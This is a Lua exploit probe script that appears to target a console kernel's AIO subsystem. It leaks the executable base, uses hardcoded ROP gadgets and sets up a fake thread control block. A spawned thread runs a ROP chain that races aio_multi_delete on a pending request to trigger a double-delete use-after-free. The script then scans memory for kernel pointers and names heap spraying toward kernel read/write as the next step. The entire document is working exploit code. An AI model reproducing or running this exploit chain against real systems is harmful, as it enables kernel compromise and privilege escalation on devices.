-- CRASH_CLASS: HIGH
-- PROBE 65e: aio_multi_delete TOCTOU race on PENDING requests
--
-- 65d showed delete on completed AIO returns 0x80020010 (already done).
-- The TOCTOU window is during pending request deletion — the lock-drop
-- path only fires when 662 needs to cancel/free a still-active request.
--
-- Strategy: submit AIO read on a socketpair (no data written → stays
-- pending), then race two 662 calls + immediate resubmit.

print("=== PROBE 65e: aio_multi_delete race (pending) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV + SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Fake TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- AIO init
print("")
print("[A] AIO init + socketpair")
pcall(function() mk(670)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)

-- Create socketpair for blocking AIO
local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(1), uint64(0), sv)  -- AF_UNIX, SOCK_STREAM
end)
local sp_ret = ok_sp and sgn(rv_sp) or -999
local rd_fd = rd(N(sv)) or -1
local wr_fd = rd(N(sv) + 4) or -1
print(string.format("  socketpair ret=%d rd_fd=%d wr_fd=%d", sp_ret, rd_fd, wr_fd))
if rd_fd < 0 then print("ABORT: no socketpair"); return end

-- Set read fd to non-blocking so AIO submit doesn't block the kernel thread
-- Actually, AIO reads are async by nature, so the request should stay pending
-- without needing FIONBIO

-- AIO buffers
local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local result = memory.alloc(0x100)
local ids_main = memory.alloc(0x100)
local ids_child = memory.alloc(0x100)
local states_main = memory.alloc(0x100)
local states_child = memory.alloc(0x100)

local function fill_req(base, off, len, buf, res, fd)
    wq(N(base) + 0x00, uint64(off))
    wq(N(base) + 0x08, uint64(len))
    local bh, bl = get_hi_lo(buf)
    wd(N(base) + 0x10, bl); wd(N(base) + 0x14, bh)
    local rh, rl = get_hi_lo(res)
    wd(N(base) + 0x18, rl); wd(N(base) + 0x1C, rh)
    wd(N(base) + 0x20, fd)
    wd(N(base) + 0x24, 0)
end

local function submit_on_fd(fd)
    fill_req(reqs, 0, 64, uint64(N(data)), uint64(N(result)), fd)
    wd(N(result), 0)
    wd(N(ids_main), 0)
    local ok, rv = pcall(function()
        return mk(669)(uint64(1), reqs, uint64(1), uint64(1), ids_main)
    end)
    local id = rd(N(ids_main)) or 0
    return ok and sgn(rv) or nil, id, rd(N(result)) or 0
end

-- [B] Test: submit on socket (should stay pending) vs /dev/zero (instant)
print("")
print("[B] pending vs completed states")

-- /dev/zero reference (instant completion)
local ok5, rv5 = pcall(function()
    return mk(5)(uint64(N(memory.alloc(16))), uint64(0), uint64(0))
end)
-- Simpler: just test with the socket
local s1_ret, s1_id, s1_res = submit_on_fd(rd_fd)
print(string.format("  socket submit: ret=%s id=0x%08X result=0x%08X", tostring(s1_ret), s1_id, s1_res))

-- Poll to check state (should be pending, not completed)
if s1_id ~= 0 then
    local poll_ids = memory.alloc(8)
    local poll_states = memory.alloc(8)
    wd(N(poll_ids), s1_id)
    wd(N(poll_states), 0xDEADDEAD)
    local ok_p, rv_p = pcall(function()
        return mk(664)(poll_ids, uint64(1), poll_states)
    end)
    local poll_state = rd(N(poll_states)) or 0
    print(string.format("  poll state: 0x%08X (%s)", poll_state,
        poll_state == 1 and "PENDING" or
        poll_state == 3 and "COMPLETED" or
        string.format("unknown 0x%X", poll_state)))

    -- Now delete it
    wd(N(ids_main), s1_id)
    wd(N(states_main), 0xDEADDEAD)
    local ok_d, rv_d = pcall(function()
        return mk(662)(ids_main, uint64(1), states_main)
    end)
    local del_state = rd(N(states_main)) or 0
    print(string.format("  delete state: 0x%08X (expect 0 = freed)", del_state))

    if del_state == 0 then
        print("  *** PENDING DELETE RETURNS 0 — this is the TOCTOU path ***")
    end
end

if not alive() then print("DEAD after pending test"); return end

-- [C] RACE LOOP with pending requests
print("")
print("[C] TOCTOU race on pending AIO")

local RACE_ITERS = 8
local anomalies = 0
local kptrs = 0
local double_success = 0

for iter = 1, RACE_ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD *** (crash = possible UAF)", iter))
        break
    end

    -- Submit AIO read on socket (stays pending — no data to read)
    local sr, sid, sres = submit_on_fd(rd_fd)
    if sr ~= 0 or sid == 0 then
        print(string.format("  iter %d: submit failed ret=%s", iter, tostring(sr)))
        break
    end

    -- Prepare child's buffers
    wd(N(ids_child), sid)
    wq(N(states_child), uint64(0xBAD0DEAD))

    -- Child ROP: sysarch + 662 + thr_exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    for i = 0, ss - 1, 4 do wd(sb + i, 0) end

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(SET_FSBASE=129, &fs_ptr)
    emit(g_pop_rdi);  emit(uint64(129))
    emit(g_pop_rsi);  emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);  emit(uint64(165))
    emit(stub)

    -- 662(ids_child, 1, states_child)
    emit(g_pop_rdi);  emit(uint64(N(ids_child)))
    emit(g_pop_rsi);  emit(uint64(1))
    emit(g_pop_rdx);  emit(uint64(N(states_child)))
    emit(g_pop_rax);  emit(uint64(662))
    emit(stub)

    -- Save 662 return value
    local child_ret = memory.alloc(8)
    wq(N(child_ret), uint64(0xBAD1BAD1))
    emit(g_pop_rdi);  emit(uint64(N(child_ret)))
    emit(g_mov_m_rax)

    -- thr_exit(0)
    emit(g_pop_rdi);  emit(uint64(0))
    emit(g_pop_rax);  emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, g_bare_ret)
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)

    -- Spawn child
    local ok_t, rv_t = pcall(function() return mk(455)(par, uint64(0x38)) end)
    if not ok_t or N(rv_t) ~= 0 then
        print(string.format("  iter %d: thr_new failed", iter))
        break
    end

    -- RACE: main thread also calls 662 on the same ID
    wd(N(ids_main), sid)
    wd(N(states_main), 0xDEAD0002)
    local ok662, rv662 = pcall(function()
        return mk(662)(ids_main, uint64(1), states_main)
    end)
    local main_ret = ok662 and sgn(rv662) or -999
    local main_state = rd(N(states_main)) or 0

    -- Immediately resubmit to fill the freed slot
    local rs_ret, rs_id = submit_on_fd(rd_fd)

    -- Wait for child
    for w = 1, 25000 do local _ = rd(sb) end

    -- Read child results
    local child_state_raw = rq(N(states_child))
    local csh, csl = get_hi_lo(child_state_raw)
    local child_rv_raw = rq(N(child_ret))

    local main_ok = (main_state == 0x00000000)
    local child_ok = (csl == 0x00000000 and csh == 0)
    local child_unk = (csl == 0x80020003)
    local child_sentinel = (csl == 0xBAD0DEAD)

    -- DOUBLE SUCCESS = UAF
    if main_ok and child_ok then
        double_success = double_success + 1
        print(string.format("  iter %d: *** DOUBLE DELETE *** main=0x%X child=%s rv=%s",
            iter, main_state, fmt(child_state_raw), fmt(child_rv_raw)))
    elseif iter <= 3 or iter == RACE_ITERS or (not child_sentinel and not child_ok and not child_unk) then
        print(string.format("  iter %d: main=0x%08X child=%s rv=%s resub=0x%X",
            iter, main_state, fmt(child_state_raw), fmt(child_rv_raw), rs_id or 0))
    elseif iter == 4 then
        print("  ...")
    end

    -- Check for kptrs
    if csh ~= 0 and csh ~= 0xFFFFFFFF and csh >= 0xFFFF8000 then
        kptrs = kptrs + 1
        print(string.format("  iter %d: *** KPTR: %s ***", iter, fmt(child_state_raw)))
    end

    if not child_sentinel and not child_ok and not child_unk and csl ~= 0x80020010 then
        anomalies = anomalies + 1
    end

    -- Clean up resubmitted request
    if rs_ret == 0 and rs_id and rs_id ~= 0 then
        wd(N(ids_main), rs_id)
        wd(N(states_main), 0)
        pcall(function() mk(662)(ids_main, uint64(1), states_main) end)
    end
end

-- [D] Post-race scan
print("")
print("[D] post-race scan")
local scan_bufs = {states_main, states_child, ids_main, ids_child, result, data}
local scan_names = {"states_main", "states_child", "ids_main", "ids_child", "result", "data"}
for si = 1, #scan_bufs do
    for off = 0, 0x3C, 8 do
        local v = rq(N(scan_bufs[si]) + off)
        if v then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 then
                print(string.format("  *** KPTR in %s+0x%X: %s ***", scan_names[si], off, fmt(v)))
                kptrs = kptrs + 1
            end
        end
    end
end

-- [E] Summary
print("")
print("[E] SUMMARY")
print(string.format("  iterations:      %d", RACE_ITERS))
print(string.format("  double deletes:  %d", double_success))
print(string.format("  anomalies:       %d", anomalies))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if double_success > 0 then
    print("")
    print("*** RACE HIT — DOUBLE DELETE CONFIRMED ***")
    print("Next steps: heap spray to control reallocated object → kernel R/W")
end

-- Cleanup
pcall(function() mk(6)(uint64(rd_fd)) end)
pcall(function() mk(6)(uint64(wr_fd)) end)

print("")
print("=== 65e COMPLETE ===")
